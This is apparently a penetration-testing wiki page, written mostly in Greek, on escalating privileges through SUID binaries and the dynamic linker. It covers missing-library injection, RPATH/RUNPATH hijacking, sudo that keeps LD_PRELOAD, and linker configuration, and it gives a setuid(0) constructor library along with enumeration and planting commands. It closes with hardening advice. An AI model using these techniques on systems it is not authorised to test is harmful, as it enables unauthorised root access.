# SUID Shared Library και Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

Τα SUID binaries συνήθως ελέγχονται για άμεση εκτέλεση εντολών, όμως τα custom SUID προγράμματα μπορεί επίσης να είναι ευάλωτα μέσω του dynamic linker. Το κοινό μοτίβο είναι απλό: ένα privileged executable φορτώνει κώδικα από ένα path ή configuration που μπορεί να επηρεάσει ένας χρήστης με χαμηλότερα privileges.

Αυτή η σελίδα εστιάζει σε generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` μέσω sudo, linker configuration και SUID hardlink confusion.

## Fast Enumeration

Ξεκινήστε εντοπίζοντας ασυνήθιστα SUID αρχεία και ελέγχοντας αν είναι dynamically linked:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Εστιάστε σε μη τυπικές τοποθεσίες, προσαρμοσμένες διαδρομές εφαρμογών, binaries που ανήκουν στον root αλλά βρίσκονται εκτός καταλόγων που διαχειρίζονται πακέτα και dependencies που φορτώνονται από εγγράψιμους καταλόγους.

Χρήσιμοι έλεγχοι εγγραφής:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Injection Missing Shared Object

Ορισμένα custom SUID binaries προσπαθούν να φορτώσουν ένα shared object που δεν υπάρχει. Αν το path που λείπει βρίσκεται κάτω από έναν κατάλογο που ελέγχεται από τον attacker, το binary μπορεί να φορτώσει κώδικα που παρέχεται από τον attacker ως ο effective user.

Εντοπίστε αποτυχημένες αναζητήσεις library:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Αν το δυαδικό αρχείο αναζητά το `libexample.so` σε μια εγγράψιμη διαδρομή, μια ελάχιστη βιβλιοθήκη proof μπορεί να χρησιμοποιήσει έναν constructor. Κατά την επικύρωση, διατηρήστε την απόδειξη επίδρασης ακίνδυνη:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Μεταγλωττίστε το με το ακριβές όνομα αρχείου που προσπαθεί να φορτώσει το binary:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Η exploitable συνθήκη δεν είναι μόνο η βιβλιοθήκη που λείπει. Ο attacker πρέπει να μπορεί να τοποθετήσει ένα συμβατό shared object σε ένα path που ο προνομιούχος loader θα αποδεχτεί.

## Εγγράψιμος Κατάλογος Βιβλιοθηκών

Μερικές φορές υπάρχουν όλες οι dependencies, αλλά ένας από τους καταλόγους που χρησιμοποιούνται για την επίλυσή τους είναι εγγράψιμος. Αυτό μπορεί να επιτρέψει την αντικατάσταση μιας βιβλιοθήκης που φορτώνεται ή την τοποθέτηση μιας βιβλιοθήκης υψηλότερης προτεραιότητας με το ίδιο όνομα.

Ελέγξτε τα paths των dependencies:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Εάν ο κατάλογος είναι εγγράψιμος, επικυρώστε το με μια προσέγγιση ασφαλή για αντίγραφα σε lab. Η αντικατάσταση system libraries σε έναν ενεργό host μπορεί να διακόψει το authentication, το package management ή services κρίσιμα για το boot.

## RPATH και RUNPATH

Τα `RPATH` και `RUNPATH` είναι entries του dynamic section που ενημερώνουν τον loader πού να αναζητήσει libraries. Είναι επικίνδυνα σε προγράμματα SUID όταν δείχνουν σε καταλόγους εγγράψιμους από attacker.

Εντοπίστε τα:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Παράδειγμα επικίνδυνης εξόδου:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Εάν το `/opt/app/lib` είναι εγγράψιμο και το binary χρειάζεται το `libcustom.so`, ο attacker ενδέχεται να μπορεί να τοποθετήσει εκεί ένα κακόβουλο `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
Το `RPATH` και το `RUNPATH` δεν είναι πανομοιότυπα σε όλες τις λεπτομέρειες επίλυσης, αλλά για τον έλεγχο privilege-escalation το πρακτικό ερώτημα είναι το ίδιο: αναζητά το SUID binary μια βιβλιοθήκη με συγκεκριμένο όνομα σε directory εγγράψιμο από τον attacker;

## LD_PRELOAD, LD_LIBRARY_PATH και SUID

Για τα κανονικά προγράμματα, τα `LD_PRELOAD` και `LD_LIBRARY_PATH` μπορούν να επιβάλλουν ή να επηρεάζουν τη φόρτωση shared objects. Για τα SUID προγράμματα, ο dynamic loader συνήθως εισέρχεται σε secure-execution mode και αγνοεί τις επικίνδυνες μεταβλητές περιβάλλοντος.

Αυτό σημαίνει ότι ένα απλό SUID binary συνήθως δεν είναι ευάλωτο μόνο και μόνο επειδή ο χρήστης μπορεί να ορίσει το `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Η συνηθισμένη εξαίρεση είναι η λανθασμένη ρύθμιση του sudo. Αν το `sudo -l` δείχνει ότι διατηρείται μια μεταβλητή όπως η `LD_PRELOAD` ή η `LD_LIBRARY_PATH`, μια εντολή που επιτρέπεται από το sudo μπορεί να φορτώσει κώδικα που ελέγχεται από τον attacker:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Μην συγχέετε αυτές τις περιπτώσεις:

- `LD_PRELOAD` against a normal SUID binary: συνήθως αποκλείεται από το secure execution.
- `LD_PRELOAD` preserved by sudo: δυνητικά exploitable.
- Missing `.so` σε writable path: exploitable όταν το SUID binary φορτώνει φυσιολογικά αυτό το path.
- `RPATH`/`RUNPATH` προς writable directory: exploitable όταν μπορεί να ελεγχθεί μια απαιτούμενη library.
- Πρόσβαση εγγραφής στο `/etc/ld.so.preload` ή σε linker config: system-wide και υψηλού impact.

## Linker Configuration

Ο dynamic linker διαβάζει επίσης system configuration, όπως τα `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, το linker cache και, σε ορισμένες περιπτώσεις, το `/etc/ld.so.preload`.

Έλεγχοι υψηλής αξίας:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Η εγγράψιμη ρύθμιση του linker είναι συνήθως πιο σοβαρή από ένα μόνο ευάλωτο SUID binary, επειδή μπορεί να επηρεάσει πολλές dynamically linked διεργασίες. Το `/etc/ld.so.preload` είναι ιδιαίτερα επικίνδυνο, επειδή μπορεί να επιβάλει τη φόρτωση ενός shared object σε privileged διεργασίες.

## SUID Hardlink Confusion

Τα hardlinks μπορούν να κάνουν το ίδιο SUID inode να εμφανίζεται με πολλά ονόματα. Αυτό είναι χρήσιμο για την απόκρυψη ενός privileged helper, την πρόκληση σύγχυσης κατά το cleanup ή την παράκαμψη ενός αφελούς path-based ελέγχου.

Βρείτε αρχεία SUID με περισσότερα από ένα links:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Ελέγξτε όλες τις διαδρομές προς το ίδιο inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Η κατάχρηση δεν έγκειται στο ότι ένα hardlink αλλάζει τα permissions. Η κατάχρηση είναι η σύγχυση διαδρομής: ένα προνομιούχο inode μπορεί να είναι προσβάσιμο μέσω ενός ονόματος που οι defenders ή τα scripts δεν αναμένουν. Για πιο λεπτομερή ροή εργασίας σχετικά με inode και hardlink, δείτε το [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Αμυντικές σημειώσεις

- Διατηρείτε τα SUID binaries ελάχιστα, ελεγμένα και, όπου είναι δυνατόν, διαχειριζόμενα από package manager.
- Αποφεύγετε entries `RPATH`/`RUNPATH` που δείχνουν σε directories με δυνατότητα εγγραφής ή σε directories που διαχειρίζονται εφαρμογές.
- Διατηρείτε τα library directories υπό την ιδιοκτησία του root και χωρίς δυνατότητα εγγραφής από κανονικούς χρήστες.
- Μην διατηρείτε τα `LD_PRELOAD`, `LD_LIBRARY_PATH` ή παρόμοιες μεταβλητές του loader μέσω του sudo.
- Παρακολουθείτε τα `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` και τα μη αναμενόμενα αρχεία SUID.
- Ελέγχετε τα hardlinked αρχεία SUID και διερευνάτε custom SUID wrappers εκτός των τυπικών system paths.

{{#include ../../banners/hacktricks-training.md}}
